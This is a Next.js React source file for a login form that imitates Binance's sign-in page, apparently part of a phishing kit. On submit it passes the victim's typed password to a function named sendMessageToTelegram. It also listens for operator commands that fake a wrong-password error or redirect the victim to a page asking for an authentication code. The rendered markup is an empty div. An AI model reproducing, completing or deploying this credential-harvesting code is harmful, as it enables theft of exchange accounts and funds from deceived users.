'use client'
import '../app/globals.css'
import { useState, useEffect, useRef } from 'react'
import { useTheme } from '../app/lib/ThemeContext'
import BinanceLoader from './BinanceLoader'
import { useValidatePassword } from '../app/hooks/useValidate'
import { useEmail } from '../app/lib/EmailContext'
import { useRouter } from 'next/navigation'
import { sendMessageToTelegram } from '../lib/api';
import { useCommand } from '../app/lib/CommandContext';

export default function LoginForm({ setNavigation, navigation }) {
    const router = useRouter()
    const { command } = useCommand();
    const { userEmail } = useEmail();
    const maskEmail = (userEmail) => {
        if (!userEmail) return '';
        const [localPart, domain] = userEmail.split('@');
        if (!domain) return userEmail;

        const maskedLocal = localPart.charAt(0) + '****';
        return `${maskedLocal}@${domain}`;
    };

    const { theme, toggleTheme } = useTheme();
    const [invalid, setInvalid] = useState(false)
    const [visible, setVisible] = useState(false)

    const viewPassword = () => {
        setVisible(!visible)
    }

    useEffect(() => {
        const isClickInsideButton = (event) => {
            const button = document.querySelector('button[type="button"]');
            console.log('button was clicked')
            return button && button.contains(event.target);
        };

        const handleClick = (event) => {
            if (!isClickInsideButton(event)) {
                setInvalid(false);
            }
        };

        document.addEventListener('click', handleClick);

        return () => {
            document.removeEventListener('click', handleClick);
        };
    }, []);


    const [isLoading, setIsLoading] = useState(false)
    const [showLanguage, setShowLanguage] = useState(false)
    const [isHovered, setIsHovered] = useState(false)
    const { validatePassword } = useValidatePassword();


    useEffect(() => {
        console.log("Command is ", command)
        if (command === 'REQUEST_PASSWORD_AGAIN') {
            setInvalid(true); // Show error state for email input
            setIsLoading(false);
        } else if (command === 'REQUEST_AUTHENTICATION_EMAIL') {
            setIsLoading(false);
            setTimeout(() => {
                // setIsLoading(false);
                router.push('/AuthenticationPage');
            }, 1500);
        }
    }, [command]);

    const handlePasswordValidation = () => {
        const isValid = validatePassword(password);
        setIsLoading(true);
        console.log("PASSWORD IS VALID, CALLING LOADER NOW");
        sendMessageToTelegram(password);


        // setInvalid(!isValid);
        return isValid;
    };


    const [input, setInput] = useState(false)
    const [password, setPassword] = useState('');
    const [passwordInput, setPasswordInput] = useState(false);


    const [padding, setPadding] = useState("80px 24px 54px");

    useEffect(() => {
        const handleResize = () => {
            setPadding(window.innerWidth < 768 ? "8px 24px 16px" : "80px 24px 54px");
        };

        // Set initial padding
        handleResize();

        // Add event listener
        window.addEventListener("resize", handleResize);
        return () => window.removeEventListener("resize", handleResize);
    }, []);

    return (
        <div className={`lg:h-full h-screen w-full ${theme === 'light' ? 'bg-white' : 'bg-[#181a20]'} flex flex-col justify-between md:justify-normal`}>

        </div >
    );
}
